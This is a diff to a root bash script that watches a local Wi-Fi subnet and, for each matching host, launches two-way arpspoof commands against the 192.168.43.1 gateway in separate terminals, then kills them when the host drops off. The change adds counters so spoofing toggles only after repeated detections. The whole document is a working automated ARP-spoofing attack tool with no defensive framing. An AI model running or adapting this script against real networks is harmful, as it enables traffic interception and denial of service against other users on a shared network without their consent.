@@ -1,8 +1,10 @@
 #~/bin/bash
 declare -a ar
+declare -a br
 for i in `seq 1 255`
 do
     ar[i]=0
+    br[i]=4
 done
 output=/root/shell/damn/damn.txt
 greper=/root/shell/greper.txt
@@ -31,28 +33,38 @@ do
     grep $str greper.txt >> $grep2
     grep2s=$(cat $grep2)
     if [ -n "$grep2s" ]; then
-        if [ ${ar[i]} == 0 ]; then
-            echo "boom" $str
-            echo '\n'
-            ar[i]=1
-            chmod a+x $records${i}
-            > $records${i}
-            echo "arpspoof -i wlan0 -t 192.168.43.1 ${str}" >> $records${i}
-            gnome-terminal -t "arp down ${str}" -- $records${i}
-            chmod a+x $recordx${i}
-            > $recordx${i}
-            echo "arpspoof -i wlan0 -t ${str} 192.168.43.1" >> $recordx${i}
-            gnome-terminal -t "arp up ${str}" -- $recordx${i}
-        else
-            echo "already1" $str
-            echo '\n'
-        fi
+        br[i]=`expr ${br[i]} + 1`
+        if [ ${br[i]} == 6 ]; then
+            br[i]=5
+        elif [ ${br[i]} == 5 ]; then
+            if [ ${ar[i]} == 0 ]; then
+                echo "boom" $str
+                echo '\n'
+                ar[i]=1
+                chmod a+x $records${i}
+                > $records${i}
+                echo "arpspoof -i wlan0 -t 192.168.43.1 ${str}" >> $records${i}
+                gnome-terminal -t "arp down ${str}" -- $records${i}
+                chmod a+x $recordx${i}
+                > $recordx${i}
+                echo "arpspoof -i wlan0 -t ${str} 192.168.43.1" >> $recordx${i}
+                gnome-terminal -t "arp up ${str}" -- $recordx${i}
+            else
+                echo "already1" $str
+                echo '\n'
+            fi
+        fi    
     else
-        if [ ${ar[i]} == 1 ]; then
-            ar[i]=0
-            echo "calm down" $str
-            echo '\n'
-            kill -s KILL $(ps au | grep $str | grep arpspoof | awk '{print $2}')
+        br[i]=`expr ${br[i]} - 1`
+        if [ ${br[i]} == -1 ]; then
+            br[i]=0
+        elif [ ${br[i]} == 0 ]; then 
+            if [ ${ar[i]} == 1 ]; then
+                ar[i]=0
+                echo "calm down" $str
+                echo '\n'
+                kill -s KILL $(ps au | grep $str | grep arpspoof | awk '{print $2}')
+            fi
         fi
     fi
 done
